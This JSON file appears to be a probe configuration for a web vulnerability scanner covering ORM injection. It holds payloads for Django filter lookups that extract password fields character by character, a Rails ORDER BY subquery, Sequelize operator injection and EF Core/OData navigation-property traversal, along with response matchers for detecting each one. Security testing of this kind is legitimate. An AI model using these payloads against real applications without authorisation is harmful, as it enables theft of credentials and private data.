{
  "category": "orm_leak",
  "contexts": {
    "django_filter": {
      "description": "Django ORM filter injection -- manipulate queryset filter kwargs to access unauthorized fields or extract data",
      "tech_match": ["Django", "Python"],
      "param_match": ["filter", "search", "query", "sort", "order_by", "field", "lookup"],
      "probes": [
        {
          "payload": "password__startswith=a",
          "description": "Django ORM field traversal -- access password field via queryset filter (__startswith, __contains, __regex lookups). Compare response for true/false to extract character by character.",
          "matchers": [
            {"type": "length_diff", "min_diff": 50}
          ],
          "severity": "high",
          "confidence_boost": 50
        },
        {
          "payload": "email__regex=.*",
          "description": "Django ORM regex filter -- inject regex via __regex lookup to extract field values or cause ReDoS",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 100}
          ],
          "severity": "high",
          "confidence_boost": 45
        }
      ]
    },
    "rails_arel": {
      "description": "Rails ActiveRecord injection -- manipulate Arel queries via hash parameter injection or order clause",
      "tech_match": ["Ruby", "Rails"],
      "param_match": ["sort", "order", "filter", "where", "search", "q"],
      "probes": [
        {
          "payload": "name ASC, (SELECT 1 FROM users LIMIT 1)--",
          "description": "Rails ORDER BY injection -- if order parameter is interpolated into SQL, subquery can extract data",
          "matchers": [
            {"type": "status", "status": [200, 500]},
            {"type": "word", "words": ["PG::Error", "ActiveRecord", "SQLite3", "Mysql2"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 50
        }
      ]
    },
    "sequelize_injection": {
      "description": "Sequelize ORM operator injection -- inject Sequelize operators ($gt, $like, $between) via JSON parameter parsing",
      "tech_match": ["Node.js", "Express", "Sequelize"],
      "param_match": ["where", "filter", "search", "query", "conditions"],
      "probes": [
        {
          "payload": "{\"$gt\": \"\"}",
          "description": "Sequelize operator injection via JSON -- if request body parsed as JSON and passed to findAll(), operators bypass intended filters",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 200}
          ],
          "severity": "high",
          "confidence_boost": 45
        }
      ]
    },
    "dotnet_efcore": {
      "description": "EF Core / OData navigation-property traversal (PortSwigger Top-10 2025 #2, 'ORM Leaking More Than You Joined For') -- a search/filter param that traverses a navigation property reaches a RELATED table's sensitive columns the endpoint never meant to expose.",
      "tech_match": [".NET", "ASP.NET", "IIS"],
      "param_match": ["filter", "search", "sort", "order", "orderby", "where", "expand", "select", "field", "q", "$filter", "$expand", "$select", "$orderby"],
      "probes": [
        {
          "payload": "Owner/Password ne null",
          "description": "Navigation-property traversal in a filter -- EF Core throws a translation error when the path reaches a column/relationship it cannot map, confirming the param drives an EF query.",
          "matchers": [
            {"type": "word", "words": ["The LINQ expression", "could not be translated", "Microsoft.EntityFrameworkCore", "System.InvalidOperationException", "System.Data.Entity"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 50
        },
        {
          "payload": "$expand=*",
          "description": "OData $expand wildcard -- pulls every navigation property (related entities) into the response; a valid-but-unintended expand leaks related-table data or an OData validation error confirms the surface.",
          "matchers": [
            {"type": "word", "words": ["The query specified in the URI is not valid", "Microsoft.OData", "System.Web.Http.OData", "ODataException", "@odata.context"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 45
        },
        {
          "payload": "Owner.Role eq 'admin'",
          "description": "Boolean relationship filter -- if the related-entity predicate changes the result set vs baseline, the filter reaches a joined table (extractable one predicate at a time).",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 80}
          ],
          "severity": "high",
          "confidence_boost": 40
        }
      ]
    }
  }
}
